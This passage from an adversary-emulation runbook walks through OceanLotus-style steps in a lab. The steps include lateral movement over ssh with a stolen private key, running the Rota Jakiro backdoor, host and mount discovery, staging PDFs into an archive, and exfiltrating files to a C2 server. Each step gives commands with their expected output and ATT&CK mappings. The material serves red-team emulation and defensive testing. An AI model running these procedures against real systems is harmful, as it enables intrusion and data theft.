   [SUCCESS] 2023/08/24 19:29:43 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [Task] 2023/08/24 19:29:52
   [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
   ```
4. Give Rota Jakiro executable permissions
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"chmod +x /tmp/rota\""}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:29:43 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [Task] 2023/08/24 19:29:52
   [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
   ```

5. Use OceanLotus to Execute Rota Jakiro on the Linux host using ssh & confirm registration.
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:31:44 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   ...
   [INFO] 2023/08/24 19:31:57 Received first-time beacon from 01020304. Creating session...

   [SUCCESS] 2023/08/24 19:31:57 *** New session established: 01020304 ***
   +----------+------------+----------+------+-----+------+
   |   GUID   | IP ADDRESS | HOSTNAME | USER | PID | PPID |
   +----------+------------+----------+------+-----+------+
   | 01020304 |            |          |      |   0 |    0 |
   +----------+------------+----------+------+-----+------+

   [INFO] 2023/08/24 19:31:57 Current Directory:
   [INFO] 2023/08/24 19:31:57 Successfully added session.
   [SUCCESS] 2023/08/24 19:31:57 Successfully created session for implant 01020304.
   ```

<details><summary>Troubleshooting</summary>
   Check to make sure the binary for rota is in the correct location for download. Handlers will look for payloads to download using the resources/payloads/<handler-name> logic.

</details>

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                                                                                                                                | Source Code Link                                                                                                                                                                                                   | ATT&CK Technique                                                      | Relevant CTI Report                                                                                                                                                                                                                                                                                        |
   | ------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
   | OSX.OceanLotus implant downloads RotaJakiro as `osx.download`                                                                                    | [Download instruction `0x23` or `0x3C`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L231-L239)<br><br>[writeFile](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L55-L66)                   | T1105 Ingress Tool Transfer                                           | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                           |
   | OSX.OceanLotus implant leverages popen to execute shell commands                                                                                 | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1059.004 Command and Scripting Interpreter: Unix Shell               | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html<br><br>https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |
   | OSX.OceanLotus implant executes `ls -la /Users/hpotter/Library/WebKit/osx.download`                                                              | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1083 File and Directory Discovery                                    | -                                                                                                                                                                                                                                                                                                          |
   | OSX.OceanLotus implant returns command output via HTTP POST request to the C2 server                                                             | [Send `POST` with command output](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L252)<br><br>[Communication library exported `sendRequest`](../Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp#L89-L174) | T1071.001 Application Layer Protocol: Web Protocols                   | https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html<br><br>https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html                                                                                           |
   | OSX.OceanLotus implant executes `scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota`                          | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1570 Lateral Tool Transfer                                           | -                                                                                                                                                                                                                                                                                                          |
   | OSX.OceanLotus implant executes `ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\"` | [Execute command instruction `0xAC`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L240-L253)<br><br>[`executeCmd`](../Resources/OSX.OceanLotus/Implant/Implant/ClientPP.cpp#L8-L29)                    | T1021.004 Remote Services: SSH                                        | -                                                                                                                                                                                                                                                                                                          |
   | Rota execution establishes persistence                                                                                                           | [nonroot-persistence](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L96)                                                                  | T1547.013 - Boot or Logon Autostart Execuction: XDG Autostart Entries | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/                                                                                                                                                                                                                                                |
   | Rota creates shared memory for process monitoring                                                                                                | [watchdog_process_shmget](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L394)                                                             | T1106 - Native API                                                    | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/                                                                                                                                                                                                                                                |
   | Rota leverages shared memory for monitoring pids in ```/proc/```                                                                                 | [monitor_proc](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/Public-Release/Resources/rota/src/persistence.c#L340)                                                                        | T1559 - Inter-Processs Communication                                  | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/                                                                                                                                                                                                                                                |


   </summary>
</details>

### 🔬 Blue Team Notes

None.

## Step 4 - Discovery on Linux Host

### 📖 Overview

**Step 4** emulates OceanLotus executing conducting discovery on the Linux host.

For initial collection, Rota Jakiro executes and collects the results from the `uname`
syscall. Rota Jakiro sends the following information regarding the Linux host to the C2
server: host name, architecture, and kernel version. Rota Jakiro then downloads and
executes a shared object (`mount.so`) to perform discovery for mounted drives connected
to the Linux host. The resulting information is saved to `mount.txt`. Rota Jakiro then
uploads this file to the C2 server for offline analysis.

---

### 👾 Red Team Procedures

1. Use Rota Jakiro to collect the device information from the target using the `uname`
   syscall.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_dev_info"}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:38:08 Successfully set task for session: 01020304
   [INFO] 2023/08/24 19:38:10 New task received for UUID:  01020304
   [INFO] 2023/08/24 19:38:10 Sending new task to implant: 01020304
   [INFO] 2023/08/24 19:38:10 Received task output for session:  01020304
   [Task] 2023/08/24 19:38:10 drogon-Linux-5.15.0-1040-aws
   [SUCCESS] 2023/08/24 19:38:10 Successfully set task output.
   ```
2. Download `mount.so` shared object to execute the `mount` command to discover drives
   on the Linux host.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "mount.so"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/24 13:30:10 Received beacon from existing implant 01020304.
   [INFO] 2023/08/24 13:30:10 Received task output for session:  01020304
   [Task] 2023/08/24 13:30:10 successfully wrote entire file.
   [SUCCESS] 2023/08/24 13:30:10 Successfully set task output.
   ```
3. Verify the file upload successfully occurred.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
   [Task] 2023/08/24 13:26:12 file exists
   [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
   ```
4. Execute the shared object using the `update` command
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg":"update"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/24 13:26:12 Received beacon from existing implant 01020304.
   [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
   [Task] 2023/08/24 13:26:12 Shared Object Executed!
   [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
   ```
5. Exfil the `/tmp/mount.txt` file to the C2 server
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/mount.txt"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/24 13:29:04 Received beacon from existing implant 01020304.
   [SUCCESS] 2023/08/24 13:29:04 File uploaded: Successfully uploaded file to control server at './files/mount.txt'
   [INFO] 2023/08/24 13:29:04 No tasks available for UUID:  01020304
   ```
6. View the retrieved file on the C2 server
   ```
   cat ./files/mount.txt
   ```

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                                                            | Source Code Link                                                                                                                               | ATT&CK Technique                   | Relevant CTI Report                                         |
   | ---------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------- | ----------------------------------------------------------- |
   | Rota executes `uname` for host discovery                                     | [uname syscall](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/c2_commands.c#L102) | T1082 System Information Discovery | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/ |
   | Rota executes a shared object that calls `mount` for network share discovery | [mount](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_mount.c)                 | T1135 Network Share Discovery      | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/ |

 </details>

### 🔬 Blue Team Notes

None

## Step 5 - Collection

### 📖 Overview

**Step five** emulates OceanLotus conducting collection of data using shared objects.

OceanLotus downloads and executes a shared object on the Linux host (pdf.so).

The shared object performs the following actions:
- Creates the `tmp.rota` folder
- Starting from the $HOME folder using the `find` command, copy files with a `.pdf`
  extension into the `tmp.rota` folder
- All files are then compressed into a single file named `rota.tar.gz`

Rota Jakiro confirms the target file was created.

>Note: CTI reporting states Rota Jakiro uses shared objects for code execution. There is
>no public CTI reporting documenting exactly what these shared objects are executing.
>Therefore, the following code execution is based off general behaviors derived from CTI
>reporting targeting linux hosts.

---

### 👾 Red Team Procedures

1. Upload the shared object onto the Linux host.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "pdf.so"}'
   ```
2. Verify the shared object was uploaded to the Linux host.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/21 19:35:34 Received task output for session:  01020304
   [Task] 2023/08/21 19:35:34 file exists
   [SUCCESS] 2023/08/21 19:35:34 Successfully set task output.
   ```
3. Execute the Rota Jakiro `run_plugin` command to execute the shared object.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg": "update"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/21 19:36:22 New task received for UUID:  01020304
   [INFO] 2023/08/21 19:36:32 Received task output for session:  01020304
   [Task] 2023/08/21 19:36:32 Shared Object Executed!
   [SUCCESS] 2023/08/21 19:36:32 Successfully set task output.
   ```
4. Verify the `.tar` file exsists before exfil.
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"/tmp/rota.tar.gz"}'
   ```
   Expected Output:
   ```
   [INFO] 2023/08/21 19:37:53 New task received for UUID:  01020304
   [INFO] 2023/08/21 19:37:53 Sending new task to implant: 01020304
   [INFO] 2023/08/21 19:37:53 Received task output for session:  01020304
   [Task] 2023/08/21 19:37:53 file exists
   [SUCCESS] 2023/08/21 19:37:53 Successfully set task output.
   ```

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                                        | Source Code Link                                                                                                                                 | ATT&CK Technique                                                                    | Relevant CTI Report                                                                                                                               |
   | -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
   | Rota executes a Shared Object to create a staging folder | [hidden directory creation](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c) | T1074.001 Data Staged: Local Data Staging</p>T1083 File and Directory Discovery     | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/                                                                                       |
   | Rota executes a Shared Object for automated collection   | [automated collection](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c)      | T1119 Automated Collection</p>T1560.001 Archive Collected Data: Archive via Utility | https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/</p>https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/ |


 </details>

## Step 6 - Exfil from Linux Host

### 📖 Overview

**Step 6** emulates OceanLotus exfiltrating data of interest. OceanLotus tasks Rota
Jakiro to upload the `/tmp/rota.tar.gz` file to the C2 server completing the objective.
*Note, the C2 server is limited to recieve data up to but not exceeding 65535 bytes.*

---

### 👾 Red Team Procedures

1. Exfil the `rota.tar.gz` file
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/rota.tar.gz"}'
   ```
   NOTE: Payloads exfiled must be 65535 bytes due to limits in buffer size.
   Expected Output:
   ```
   [SUCCESS] 2023/08/21 19:39:12 Successfully set task for session: 01020304
   [INFO] 2023/08/21 19:39:14 New task received for UUID:  01020304
   [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
   [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
   ```
2. Verify on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
   ```
   ls -lart ./files
   ```
3. Give yourself a high five 🙌, mission accomplished! 💃
4. Kill Rota Jakiro
   ```
   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_exit"}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/24 19:01:18 Successfully set task for session: 01020304
   ...
   [INFO] 2023/08/24 19:01:18 Received task output for session:  01020304
   [Task] 2023/08/24 19:01:18 exiting!
   [SUCCESS] 2023/08/24 19:01:18 Successfully set task output.
   [INFO] 2023/08/24 19:01:18 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
   [Task] 2023/08/24 19:01:18
   ```

The End 💔

### 🔮 Reference Code & Reporting

<details>
   <summary>Click to expand table</summary>

   | Red Team Activity                            | Source Code Link                                                                                                                                 | ATT&CK Technique                   | Relevant CTI Report |
   | -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------- | ------------------- |
   | Rota exfils previously created tar directory | [hidden directory creation](https://github.com/center-for-threat-informed-defense/ocean-lotus/blob/rota-docs-update/Resources/rota/src/so_pdf.c) | T1041 Exfiltration Over C2 Channel | N/A                 |

 </details>

### 🔬 Blue Team Notes

None

:red_circle: End of Scenario.
